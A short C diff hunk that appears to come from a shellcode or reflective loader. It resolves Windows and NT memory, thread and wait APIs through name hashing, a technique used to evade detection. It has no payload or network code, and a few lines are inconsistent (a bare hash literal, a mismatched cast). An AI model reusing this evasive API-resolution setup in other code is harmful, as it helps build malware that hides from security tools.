@@ -24,10 +24,26 @@ BOOL LdrAllocateCoreStructsAndLoadApis() {
 	ldr->modules->ntdll    = ntdll;
 	ldr->modules->kernel32 = kernel32;
 
+
+
+
+
 	ldr->win32->GetProcAddress = (pGetProcAddress)GetProc(kernel32, HASHED_GetProcAddress);
 	ldr->win32->LoadLibraryA = (pLoadLibraryA)GetProc(kernel32, HASHED_LoadLibraryA);
 	ldr->win32->LocalFree = (pLocalFree)GetProc(kernel32, HASHED_LocalFree);
 	ldr->win32->LocalReAlloc = (pLocalReAlloc)GetProc(kernel32, HASHED_LocalReAlloc);
+	ldr->win32->RtlExitUserThread = (pRtlExitUserThread)GetProc(ntdll, HASHED_RtlExitUserThread);
+	ldr->win32->NtAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetProc(ntdll, 0x6793c34c);
+	ldr->win32->NtProtectVirtualMemory = (pNtProtectVirtualMemory)GetProc(ntdll, NTPROTECTVIRTUALMEMORY_HASH);
+	ldr->win32->NtFlushInstructionCache = (pNtFlushInstructionCache)GetProc(ntdll, NTFLUSHINSTRUCTIONCACHE_HASH);
+	ldr->win32->NtFreeVirtualMemory = (NtFreeVirtualMemory)GetProc(ntdll, HASHED_NtFreeVirtualMemory);
+#ifdef LISTEN_AND_WAIT
+	ldr->win32->CreateThread = (pCreateThread)GetProc(kernel32, HASHED_CreateThread);
+	ldr->win32->CloseHandle = (pCloseHandle)GetProc(kernel32, HASHED_CloseHandle);
+	ldr->win32->RegisterWaitForSingleObject = (pRegisterWaitForSingleObject)GetProc(kernel32, HASHED_RegisterWaitForSingleObject);
+	ldr->win32->UnregisterWait = (pUnregisterWait)GetProc(kernel32, HASHED_UnregisterWait);
+	ldr->win32->FreeLibrary = (pFreeLibrary)GetProc(kernel32, HASHED_FreeLibrary);
+#endif
 
 	return TRUE;
 }
